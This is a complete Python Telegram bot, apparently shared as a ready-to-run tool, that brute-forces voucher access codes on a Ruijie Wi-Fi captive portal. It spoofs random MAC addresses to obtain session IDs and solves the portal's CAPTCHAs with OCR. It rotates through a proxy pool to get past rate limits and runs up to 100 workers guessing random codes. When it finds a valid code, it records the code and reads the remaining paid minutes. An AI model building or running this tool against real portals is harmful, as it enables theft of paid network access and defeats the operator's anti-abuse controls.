#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Black.py — Fixed + Debug + Test Proxies
"""

import os
import sys
import re
import json
import time
import base64
import random
import string
import asyncio
import datetime

from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

import aiohttp
from aiohttp_socks import ProxyConnector

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters)

import ddddocr

# ─────────────────────────── CONFIG ───────────────────────────

TOKEN_FILE = "bot_token.txt"
PROXY_FILE = "proxies.txt"
PORTAL_URL_PATH = "portal_url_"

ADMIN_IDS = [6537847588]

NUM_WORKERS = 100
MAX_CODES_PER_SESSION = 100000
MAX_CODES_PER_SID = 200
TIMEOUT_SEC = 20

user_scanners = {}
_proxy_manager = None
_ocr_instance = None
is_testing_proxies = False


# ─────────────────────────── PROXY MANAGER ───────────────────────────

class ProxyManager:
    def __init__(self, file_path=PROXY_FILE):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, line):
        line = line.strip()
        if not line:
            return None
        if "://" not in line:
            line = "http://" + line
        return line

    def load(self):
        self.proxies = []
        if os.path.exists(self.file_path):
            with open(self.file_path, "r") as f:
                for line in f:
                    p = self._normalize(line)
                    if p and p not in self.proxies:
                        self.proxies.append(p)
        print(f"[ProxyManager] Loaded {len(self.proxies)} proxies")
        return len(self.proxies)

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            for _ in range(len(self.proxies)):
                proxy = self.proxies[self.index % len(self.proxies)]
                self.index += 1
                if proxy not in self.bad_proxies:
                    return proxy
            self.bad_proxies.clear()
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

    def mark_bad(self, proxy):
        if proxy:
            self.bad_proxies.add(proxy)

    def reload(self):
        return self.load()

    def stats(self):
        return len(self.proxies), len(self.proxies)


def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager()
    return _proxy_manager


# ─────────────────────────── PROXY TEST ───────────────────────────

async def test_single_proxy(proxy, timeout_sec=20):
    try:
        timeout = aiohttp.ClientTimeout(total=timeout_sec)
        if proxy.startswith("socks"):
            connector = ProxyConnector.from_url(proxy, ssl=False)
            session = aiohttp.ClientSession(connector=connector, timeout=timeout)
            async with session:
                async with session.get("https://api.ipify.org?format=json") as resp:
                    if resp.status == 200:
                        return proxy
        else:
            session = aiohttp.ClientSession(timeout=timeout)
            async with session:
                async with session.get("https://api.ipify.org?format=json", proxy=proxy) as resp:
                    if resp.status == 200:
                        return proxy
    except Exception:
        pass
    return None


async def test_all_proxies(chat_id, context):
    global is_testing_proxies
    if is_testing_proxies:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Proxy စမ်းသပ်နေဆဲဖြစ်ပါတယ်။ ပြီးအောင် ခဏစောင့်ပါ။")
        return
    is_testing_proxies = True
    pm = get_proxy_manager()
    pm.load()
    total = len(pm.proxies)
    if total == 0:
        await context.bot.send_message(chat_id=chat_id, text="❌ Proxy မရှိပါ။")
        is_testing_proxies = False
        return

    msg = await context.bot.send_message(chat_id=chat_id, text=f"🧪 Testing {total} proxies... ခဏစောင့်ပါ။")
    working = []
    batch_size = 1000
    try:
        for i in range(0, total, batch_size):
            batch = pm.proxies[i:i+batch_size]
            tasks = [asyncio.wait_for(test_single_proxy(p), timeout=9) for p in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if r and not isinstance(r, Exception):
                    working.append(r)
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg.message_id,
                    text=f"🧪 Testing... {min(i+batch_size, total)}/{total} (Working: {len(working)})"
                )
            except Exception:
                pass
        # ⭐ အလုပ်လုပ်တဲ့ Proxy တွေကိုပဲ ဖိုင်ထဲ ပြန်သိမ်း
        with open(PROXY_FILE, "w") as f:
            f.write("\n".join(working))
        pm.load()
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=msg.message_id,
            text=f"✅ Test ပြီးပါပြီ!\n\n🟢 Working: {len(working)}/{total}\n🔴 Dead: {total - len(working)}/{total}\n\nအလုပ်လုပ်တဲ့ Proxy တွေကို `proxies.txt` မှာ သိမ်းထားပါတယ်။"
        )
    except Exception as e:
        print(f"[TEST ERROR] {e}")
    finally:
        is_testing_proxies = False


# ─────────────────────────── OCR ───────────────────────────

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


def ocr_image_bytes_fast(image_bytes):
    ocr = get_ocr_instance()
    return ocr.classification(image_bytes).strip().upper()


# ─────────────────────────── USER DATA ───────────────────────────

def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        p_file = PORTAL_URL_PATH + str(user_id) + ".txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None
        user_scanners[user_id] = {
            "mode": "num6",
            "char_set": "012345678",
            "code_len": 6,
            "start_digit": None,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None,
            "stats": {"tried": 0, "hits": 0, "expired": 0, "limits": 0,
                      "start_time": time.time()},
            "valid_codes": [],
            "tried_codes": set(),
            "recent_logs": [],
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": None,
        }
    return user_scanners[user_id]


# ─────────────────────────── HELPERS ───────────────────────────

def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    else:
        sep = "&" if "?" in url else "?"
        return url + sep + "mac=" + new_mac


def create_connector_for_proxy(proxy):
    try:
        if not proxy:
            return None
        if proxy.startswith("socks4://") or proxy.startswith("socks5://"):
            return ProxyConnector.from_url(proxy, ssl=False)
        else:
            if "://" not in proxy:
                proxy = "http://" + proxy
            return ProxyConnector.from_url(proxy, ssl=False)
    except Exception as e:
        print(f"[Proxy Connector] Error: {e}")
        return None


API_BASE = "https://portal-as.ruijienetworks.com"
LOGIN_URL = API_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = API_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = API_BASE + "/api/auth/captcha/verify"
BALANCE_URL = API_BASE + "/api/auth/balance/getBalance/"


# ─────────────────────────── GATEWAY / SESSION ───────────────────────────

async def get_sid_from_gateway(session, portal_url, user_id, proxy=None):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                             "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
    use_proxy = None if (proxy and proxy.startswith("socks")) else proxy
    try:
        parsed = parse_qs(urlparse(portal_url).query)
        sid = parsed.get("sessionId") or parsed.get("sid")
        if sid:
            print(f"[SID] Found in URL: {sid[0]}")
            return sid[0]

        mac = generate_random_mac()
        spoofed_url = replace_mac(portal_url, mac)
        print(f"[SID] Requesting: {spoofed_url[:100]}")

        async with session.get(spoofed_url, headers=headers,
                               timeout=TIMEOUT_SEC, ssl=False, proxy=use_proxy,
                               allow_redirects=True) as r2:
            body = await r2.text()
            final_url = str(r2.url)
            print(f"[SID] Got status {r2.status}, final: {final_url[:100]}")

            m = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final_url)
            if m:
                print(f"[SID] Found in final URL: {m.group(1)}")
                return m.group(1)

            m2 = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if m2:
                redirect_url = m2.group(1)
                print(f"[SID] Redirect: {redirect_url[:100]}")
                async with session.get(redirect_url, headers=headers,
                                       timeout=TIMEOUT_SEC, ssl=False, proxy=use_proxy,
                                       allow_redirects=True) as r3:
                    final3 = str(r3.url)
                    m3 = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final3)
                    if m3:
                        print(f"[SID] Found after redirect: {m3.group(1)}")
                        return m3.group(1)

            m4 = re.search(r'sessionId["\']?\s*[:=]\s*["\']([a-zA-Z0-9]+)', body)
            if m4:
                print(f"[SID] Found in body: {m4.group(1)}")
                return m4.group(1)

        print(f"[SID] Not found for {portal_url[:80]}")
        return None
    except Exception as e:
        print(f"[SID] Error: {type(e).__name__}: {e}")
        return None


# ─────────────────────────── BALANCE ───────────────────────────

async def fetch_balance(active_token, proxy=None):
    url = BALANCE_URL + active_token + "?lang=en_US"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "referer": API_BASE + "/download/static/maccauth/src/balance.html?sessionId=" + active_token,
        "user-agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    use_proxy = None if (proxy and proxy.startswith("socks")) else proxy
    try:
        if proxy and proxy.startswith("socks"):
            connector = create_connector_for_proxy(proxy)
            session = aiohttp.ClientSession(connector=connector)
        else:
            session = aiohttp.ClientSession()
        async with session:
            async with session.get(url, headers=headers, ssl=False,
                                   timeout=TIMEOUT_SEC, proxy=use_proxy) as resp:
                data = await resp.json()
        inner = data.get("result", data) if isinstance(data, dict) else {}
        profile_name = inner.get("profileName") or "N/A"
        raw_total = inner.get("totalMinutes") or 0
        try:
            total_minutes = int(raw_total)
        except Exception:
            total_minutes = 0
        hours, minutes = divmod(total_minutes, 60)
        return f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
    except Exception as e:
        return f"🃏: N/A, ⏰: Error"


async def check_balance(active_token, code, user_id, proxy_str):
    ud = get_user_data(user_id)
    balance_str = await fetch_balance(active_token, proxy_str)
    for item in ud["valid_codes"]:
        if isinstance(item, dict) and item.get("code") == code:
            item["balance_str"] = balance_str
    return balance_str


# ─────────────────────────── CODE CHECK ───────────────────────────

async def check_single_access_code(session, code, current_session_id, user_id, proxy=None):
    ud = get_user_data(user_id)
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": API_BASE,
        "referer": API_BASE + f"/download/static/maccauth/src/index.html?sessionId={current_session_id}",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
    }
    use_proxy = None if (proxy and proxy.startswith("socks")) else proxy

    auth_code = None
    for _ in range(5):
        captcha_url = CAPTCHA_IMAGE_URL + "?sessionId=" + str(current_session_id) + "&_t=" + str(int(time.time()*1000))
        try:
            async with session.get(captcha_url, headers=headers, ssl=False,
                                   timeout=TIMEOUT_SEC, proxy=use_proxy) as response:
                image_content = await response.read()
                auth_code = await asyncio.to_thread(ocr_image_bytes_fast, image_content)
                if auth_code and len(auth_code) >= 3:
                    break
        except Exception as e:
            print(f"[Captcha] Error: {e}")
            auth_code = None
    if not auth_code:
        return "failed"

    try:
        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        async with session.post(CAPTCHA_VERIFY_URL, json=v_payload, headers=headers,
                                ssl=False, timeout=TIMEOUT_SEC, proxy=use_proxy) as v_resp:
            v_data = await v_resp.json()
            if not (isinstance(v_data, dict) and v_data.get("success")):
                return "failed"

        l_payload = {"accessCode": code, "sessionId": current_session_id,
                     "apiVersion": 1, "authCode": auth_code}
        async with session.post(LOGIN_URL, json=l_payload, headers=headers,
                                ssl=False, timeout=TIMEOUT_SEC, proxy=use_proxy) as l_resp:
            l_text = await l_resp.text()
            low = l_text.lower()
            print(f"[Voucher] code={code} -> {l_text[:80]}")

            if "expired" in low:
                ud["stats"]["expired"] += 1
                return "expired"
            if "request limited" in low:
                ud["stats"]["limits"] += 1
                await asyncio.sleep(3)
                return "limit"
            if '"success":true' in low or "logonurl" in low:
                token_match = re.search(r"token=([^&\s\"\'<>]+)", l_text)
                active_token = token_match.group(1) if token_match else None
                ud["stats"]["hits"] += 1
                ud["valid_codes"].append({
                    "code": code,
                    "active_token": active_token,
                    "balance_str": None,
                })
                ud["recent_logs"].append(f"✅ HIT: {code}")
                ud["dash_update_event"].set()
                if active_token:
                    asyncio.ensure_future(check_balance(active_token, code, user_id, proxy))
                return "hit"
            return "failed"
    except asyncio.CancelledError:
        raise
    except Exception as e:
        print(f"[Check] Error: {type(e).__name__}: {e}")
        return "failed"


# ─────────────────────────── WORKER ───────────────────────────

async def worker(worker_id, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    print(f"[Worker {worker_id}] Started")

    while not ud["stop_event"].is_set():
        try:
            proxy = await pm.get_next()
            if proxy:
                print(f"[Worker {worker_id}] Using proxy: {proxy[:50]}...")
            else:
                print(f"[Worker {worker_id}] No proxy - Direct connection")

            if proxy and proxy.startswith("socks"):
                connector = create_connector_for_proxy(proxy)
                session = aiohttp.ClientSession(connector=connector)
                actual_proxy = None
            else:
                session = aiohttp.ClientSession()
                actual_proxy = proxy

            async with session:
                current_session_id = await get_sid_from_gateway(
                    session, ud["portal_url"], user_id, proxy=actual_proxy)

                if not current_session_id:
                    print(f"[Worker {worker_id}] SID failed. Marking proxy bad.")
                    pm.mark_bad(proxy)
                    await asyncio.sleep(1)
                    continue

                print(f"[Worker {worker_id}] SID = {current_session_id}")
                codes_checked_this_sid = 0

                while (not ud["stop_event"].is_set()
                       and codes_checked_this_sid < MAX_CODES_PER_SID):
                    if ud["mode"] == "custom" and ud.get("start_digit"):
                        body_chars = [ud["start_digit"]] + \
                            random.choices(ud["char_set"], k=ud["code_len"] - 1)
                        code = "".join(body_chars)
                    else:
                        code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))

                    if code in ud["tried_codes"]:
                        continue
                    ud["tried_codes"].add(code)
                    ud["CURRENT_CODE"] = code
                    ud["stats"]["tried"] += 1
                    codes_checked_this_sid += 1

                    result = await check_single_access_code(
                        session, code, current_session_id, user_id, proxy=actual_proxy)

                    if result == "hit":
                        print(f"[Worker {worker_id}] 🎉 HIT! {code}")

                    await asyncio.sleep(0.2)

        except asyncio.CancelledError:
            print(f"[Worker {worker_id}] Cancelled")
            return
        except Exception as e:
            print(f"[Worker {worker_id}] Error: {type(e).__name__}: {e}")
            await asyncio.sleep(1)


# ─────────────────────────── DASHBOARD ───────────────────────────

async def live_dashboard_updater(context, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud["stop_event"].is_set():
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = stats["tried"] / (elapsed / 60) if elapsed > 0 else 0.0
            proxy_total, proxy_active = pm.stats()
            hit_block = "None yet"
            if ud["valid_codes"]:
                hit_list = []
                for item in ud["valid_codes"][-10:]:
                    if isinstance(item, dict):
                        c = item.get("code", "?")
                        balance = item.get("balance_str") or "..."
                        hit_list.append(f"🔥 {c} {balance}")
                hit_block = "\n".join(hit_list)
            text = (
                "⚡ Scanner Running ⚡\n"
                "Thank for using By Telegram @MgBlack400\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🎸 Tried: {stats['tried']:,}\n"
                f"🎯 Current Code: {ud['CURRENT_CODE']}\n"
                f"🔥 Hits: {stats['hits']}\n"
                f"⚔️ Expired: {stats['expired']}\n"
                f"⚠️ Limits: {stats['limits']}\n"
                f"⚡ Speed: {speed_cpm:.1f} c/m\n"
                f"🔁 Proxies: {proxy_active}/{proxy_total}\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "🔥 **Hit Codes**:\n"
                f"{hit_block}\n"
                "━━━━━━━━━━━━━━━━━━\n"
            )
            keyboard = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")]])
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=text,
                reply_markup=keyboard)
        except asyncio.CancelledError:
            return
        except Exception as e:
            print(f"[Dashboard] Error: {e}")
        try:
            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=10.0)
        except asyncio.TimeoutError:
            pass
        ud["dash_update_event"].clear()


# ─────────────────────────── SCANNER ───────────────────────────

async def run_user_scanner(context, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    portal_url = ud["portal_url"]
    if not portal_url:
        return

    print(f"[Scanner] Starting for user {user_id}")
    print(f"[Scanner] Portal URL: {portal_url[:100]}")
    print(f"[Scanner] Proxy count: {len(pm.proxies)}")

    ud["stats"]["start_time"] = time.time()
    tasks = []
    worker_count = max(1, min(NUM_WORKERS, max(1, len(pm.proxies) * 2)))
    print(f"[Scanner] Starting {worker_count} workers")

    dash_task = asyncio.ensure_future(live_dashboard_updater(context, user_id))
    for i in range(worker_count):
        t = asyncio.ensure_future(worker(i, user_id))
        tasks.append(t)

    ud["task"] = dash_task

    try:
        while not ud["stop_event"].is_set():
            if all(t.done() for t in tasks):
                break
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        ud["stop_event"].set()
    finally:
        ud["stop_event"].set()
        for t in tasks:
            if not t.done():
                t.cancel()
        if dash_task and not dash_task.done():
            dash_task.cancel()
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = stats["tried"] / (elapsed / 60) if elapsed > 0 else 0.0
            proxy_total, proxy_active = pm.stats()
            hit_block = "None"
            if ud["valid_codes"]:
                hit_list = []
                for item in ud["valid_codes"]:
                    if isinstance(item, dict):
                        c = item.get("code", "?")
                        balance = item.get("balance_str") or "..."
                        hit_list.append(f"🔥 {c} {balance}")
                hit_block = "\n".join(hit_list)
            final_text = (
                "🛑 Scanner Stopped/Finished\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🔓 Total Tried: {stats['tried']:,}\n"
                f"🟢 Hits: {stats['hits']}\n"
                f"⚡ Final Speed: {speed_cpm:.1f} c/m\n"
                f"🔁 Proxies: {proxy_active}/{proxy_total}\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "📋 **All Hit Codes**:\n"
                f"{hit_block}\n"
                "━━━━━━━━━━━━━━━━━━\n"
            )
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=final_text)
        except Exception:
            pass
        ud["task"] = None


# ─────────────────────────── UI ───────────────────────────

def get_main_menu_markup():
    keyboard = [
        [InlineKeyboardButton("🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu")],
        [InlineKeyboardButton("➕ Add Proxies", callback_data="btn_add_proxies")],
        [InlineKeyboardButton("🧪 Test Proxies", callback_data="btn_test_proxies")],  # ⭐ Test Proxies
        [InlineKeyboardButton("🚀 Start Scanner", callback_data="btn_start_scanner")],
    ]
    return InlineKeyboardMarkup(keyboard)


def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


@admin_only
async def start(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    panel = (
        "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"⚙️ Current Mode: `{ud['mode']}`\n"
        f"🔁 Proxies: `{proxy_active}/{proxy_total}`\n"
    )
    await update.message.reply_text(panel,
                                    reply_markup=get_main_menu_markup(),
                                    parse_mode=ParseMode.MARKDOWN)


@admin_only
async def handle_callbacks(update, context):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data
    pm = get_proxy_manager()

    if data == "btn_update_portal":
        ud["state"] = "waiting_for_portal_url"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.reply_text("🌐 **Portal URL ကိုဖြည့်ပါ**")
        return

    elif data == "btn_mode_menu":
        keyboard = [
            [InlineKeyboardButton("Number 6", callback_data="set_mode_num6"),
             InlineKeyboardButton("Number 7", callback_data="set_mode_num7"),
             InlineKeyboardButton("Number 8", callback_data="set_mode_num8"),
             InlineKeyboardButton("Number 9", callback_data="set_mode_num9")],
            [InlineKeyboardButton("Abc 6", callback_data="set_mode_abc6"),
             InlineKeyboardButton("Mix 6", callback_data="set_mode_mix6"),
             InlineKeyboardButton("Mix 7", callback_data="set_mode_mix7"),
             InlineKeyboardButton("Mix 8", callback_data="set_mode_mix8"),
             InlineKeyboardButton("Mix 9", callback_data="set_mode_mix9")],
            [InlineKeyboardButton("Custom Start", callback_data="set_mode_custom")],
            [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")],
        ]
        await query.message.reply_text("⚙️ **Choose Scanner Mode**",
                                       reply_markup=InlineKeyboardMarkup(keyboard))
        return

    elif data == "btn_add_proxies":
        ud["state"] = "waiting_for_proxy_text"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.reply_text(
            "📥 **Proxy စာရင်း ထည့်ပါ**\n"
            "တစ်ကြောင်းချင်း proxy ထည့်ပါ\n"
            "ဥပမာ -\n"
            "123.45.67.89:8080\n"
            "socks5://user:pass@host:1080")
        return

    # ⭐ Test Proxies Callback
    elif data == "btn_test_proxies":
        await query.message.reply_text("🧪 Testing proxies... ခဏစောင့်ပါ။")
        asyncio.create_task(test_all_proxies(user_id, context))
        return

    elif data == "btn_start_scanner":
        if not ud["portal_url"]:
            await query.message.reply_text("❌ Portal URL မထည့်ရသေးပါ။")
            return
        ud["state"] = None
        msg = await query.message.reply_text("🔄 Initializing scanner dashboard...")
        ud["dash_msg_id"] = msg.message_id
        ud["stop_event"].clear()
        ud["stats"] = {"tried": 0, "hits": 0, "expired": 0, "limits": 0,
                       "start_time": time.time()}
        ud["valid_codes"] = []
        ud["tried_codes"] = set()
        task = asyncio.ensure_future(run_user_scanner(context, user_id))
        ud["task"] = task
        return

    elif data == "btn_back_main":
        proxy_total, proxy_active = pm.stats()
        panel = (
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔁 Proxies: `{proxy_active}/{proxy_total}`\n"
        )
        await query.message.reply_text(panel,
                                       reply_markup=get_main_menu_markup(),
                                       parse_mode=ParseMode.MARKDOWN)
        return

    elif data == "stop_scan":
        ud["stop_event"].set()
        return

    elif data.startswith("set_mode_"):
        mode = data[len("set_mode_"):]
        mode_configs = {
            "num6": ("num6", "012345678", 6),
            "num7": ("num7", "012345678", 7),
            "num8": ("num8", "012345678", 8),
            "num9": ("num9", "012345678", 9),
            "abc6": ("abc6", "abcdefghijkmnpqrstuvwxyz", 6),
            "mix6": ("mix6", "2345678abcdefghijkmnpqrstuvwxyz", 6),
            "mix7": ("mix7", "2345678abcdefghijkmnpqrstuvwxyz", 7),
            "mix8": ("mix8", "2345678abcdefghijkmnpqrstuvwxyz", 8),
            "mix9": ("mix9", "2345678abcdefghijkmnpqrstuvwxyz", 9),
        }
        if mode == "custom":
            ud["mode"] = "custom"
            ud["state"] = "waiting_for_digit"
            ud["menu_msg_id"] = query.message.message_id
            await query.message.reply_text("🔢 **Start Digit**\nနံပါတ်တစ်လုံး ထည့်ပါ")
            return
        if mode in mode_configs:
            ud["mode"], ud["char_set"], ud["code_len"] = mode_configs[mode]
            ud["state"] = None
            proxy_total, proxy_active = pm.stats()
            panel = (
                "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{ud['mode']}`\n"
                f"🔁 Proxies: `{proxy_active}/{proxy_total}`\n"
            )
            await query.message.reply_text(panel,
                                           reply_markup=get_main_menu_markup(),
                                           parse_mode=ParseMode.MARKDOWN)
        return


@admin_only
async def handle_text(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    text = update.message.text.strip()

    if ud["state"] == "waiting_for_portal_url":
        if text.startswith("http://") or text.startswith("https://"):
            ud["portal_url"] = text
            p_file = PORTAL_URL_PATH + str(user_id) + ".txt"
            with open(p_file, "w") as f:
                f.write(text)
            ud["state"] = None
            proxy_total, proxy_active = pm.stats()
            panel = (
                "✅ Portal URL သိမ်းပြီးပါပြီ\n\n"
                "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `{ud['mode']}`\n"
                f"🔁 Proxies: `{proxy_active}/{proxy_total}`\n"
            )
            await update.message.reply_text(panel,
                                            reply_markup=get_main_menu_markup(),
                                            parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Invalid URL!")
        return

    elif ud["state"] == "waiting_for_proxy_text":
        lines = [l.strip() for l in text.split("\n") if l.strip()]
        with open(PROXY_FILE, "a") as f:
            for line in lines:
                f.write(line + "\n")
        pm.reload()
        proxy_total, proxy_active = pm.stats()
        reply = (
            "✅ **Proxies သိမ်းပြီးပါပြီ**\n"
            f"📊 Total: `{proxy_total}`\n\n"
            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔁 Proxies: `{proxy_active}/{proxy_total}`\n"
        )
        ud["state"] = None
        await update.message.reply_text(reply,
                                        reply_markup=get_main_menu_markup(),
                                        parse_mode=ParseMode.MARKDOWN)
        return

    elif ud["state"] == "waiting_for_digit":
        digit = text.strip()
        if digit.isdigit() and len(digit) == 1:
            ud["start_digit"] = digit
            ud["state"] = None
            proxy_total, proxy_active = pm.stats()
            reply = (
                f"✅ Custom Start Digit = `{digit}`\n\n"
                "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                f"⚙️ Current Mode: `custom`\n"
                f"🔁 Proxies: `{proxy_active}/{proxy_total}`\n"
            )
            await update.message.reply_text(reply,
                                            reply_markup=get_main_menu_markup(),
                                            parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Single digit only!")
        return


def get_bot_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
            if token:
                return token
    token = input("Bot Token: ").strip()
    with open(TOKEN_FILE, "w") as f:
        f.write(token)
    return token


def main():
    bot_token = get_bot_token()
    pm = get_proxy_manager()
    total, active = pm.stats()
    print(f"[MAIN] Proxies: {active}/{total}")
    if total == 0:
        print("[MAIN] ⚠️ No proxies! Please add proxies.txt")
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
